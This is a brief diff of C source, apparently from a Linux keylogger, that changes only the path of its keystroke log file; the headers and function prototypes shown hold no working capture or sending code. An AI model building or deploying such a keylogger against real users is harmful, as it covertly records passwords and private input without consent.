@@ -7,7 +7,7 @@
 #include <stdlib.h>
 #include <errno.h>
 
-#define LOGFILEPATH "/home/kali/keylogger.txt"
+#define LOGFILEPATH "/home/kali/Documents/keylogger.txt"
 
 char *getEvent();
 char *keycodeToChar(int code);
